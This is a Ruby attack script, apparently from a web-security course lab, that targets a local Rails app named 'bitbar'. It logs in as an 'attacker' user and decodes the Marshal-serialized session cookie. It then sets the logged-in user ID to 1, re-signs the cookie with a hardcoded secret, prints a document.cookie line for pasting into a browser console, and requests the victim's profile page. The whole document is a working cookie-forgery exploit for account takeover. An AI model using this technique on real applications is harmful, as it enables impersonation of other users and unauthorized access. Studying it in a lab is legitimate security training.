#!/usr/bin/ruby -w

require 'mechanize'
require 'net/http'

SESSION = '_bitbar_session'
SECRET = '0a5bfbbb62856b9781baa6160ecfd00b359d3ee3752384c2f47ceb45eada62f24ee1cbb6e7b0ae3095f70b0a302a2d2ba9aadf7bc686a49c8bac27464f9acb08'

agent = Mechanize.new
url = "http://localhost:3000/login"

page = agent.get url
form = page.forms.first

form['username'] = 'attacker'
form['password'] = 'attacker'
agent.submit form

cookie, = agent.cookie_jar.jar['localhost']['/'][SESSION]
               .to_s.sub("#{SESSION}=", '').split('--')

session = Marshal.load(Base64.decode64(cookie))
puts session

session['logged_in_id'] = 1
cookie_val = Base64.encode64(Marshal.dump(session)).split.join

cookie_sig = OpenSSL::HMAC.hexdigest OpenSSL::Digest::SHA1.new, SECRET, cookie_val
cookie_all = "#{SESSION}=#{cookie_val}--#{cookie_sig}"

# print code that can be directly run in JS console
puts "\nIf you want the code that runs in JS console, look at this output, copy it:"
# JS console code:
puts "document.cookie='#{cookie_all}';\n\n"

url = URI 'http://localhost:3000/profile'
http = Net::HTTP.new(url.host, url.port)
response = http.get(url, 'Cookie': cookie_all)
puts response.body


